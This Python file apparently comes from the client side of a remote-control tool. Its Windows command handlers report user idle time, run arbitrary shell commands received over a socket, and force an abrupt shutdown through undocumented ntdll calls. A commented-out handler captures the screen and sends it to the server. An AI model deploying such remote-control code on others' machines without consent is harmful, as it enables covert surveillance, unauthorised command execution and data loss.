import ctypes
import subprocess

from client.commands.common import CommonCommands
from core.utils.client_util.decorator import desc


class WindowsCommands(CommonCommands):
    """Windows特有命令"""

    def __init__(self, socket):
        super().__init__(socket)

    @desc('detect user inactive time')
    def idletime(self):
        import win32api
        return 1, 'User has been idle for: {} seconds'.format(
            (win32api.GetTickCount() - win32api.GetLastInputInfo()) / 1000.0)


    @desc('execute shell command without waiting for results')
    def run(self, command):
        if not command:
            return 0, ''
        p = subprocess.Popen(command, creationflags=subprocess.CREATE_NEW_CONSOLE)
        return 1, 'Process created: {}'.format(p.pid)


    @desc('perform emergency shutdown')
    def poweroff(self):
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.ZwShutdownSystem(2)


    # @desc('grab a screenshot')
    # def screenshot(self):
    #     self.send_to_server(1, 'Importing module: pyautogui', 0)
    #     pyautogui = None
    #     try:
    #         import pyautogui
    #     except Exception as e:
    #         self.send_to_server(0, 'Import failed: {}'.format(e), 1)
    #
    #     self.send_to_server(1, 'Preparing to take a screenshot', 0)
    #     filename = 'screenshot_{}.png'.format(get_time())
    #     if pyautogui:
    #         pyautogui.screenshot(filename)
    #     self.send_to_server(1, 'Screenshot success', 0)
    #     self.send_to_server(1, f'Preparing to send file, length is {get_size(os.path.getsize(filename))}', 0)
    #     self.socket.send_file(self.command_id, filename)
    #     os.remove(filename)
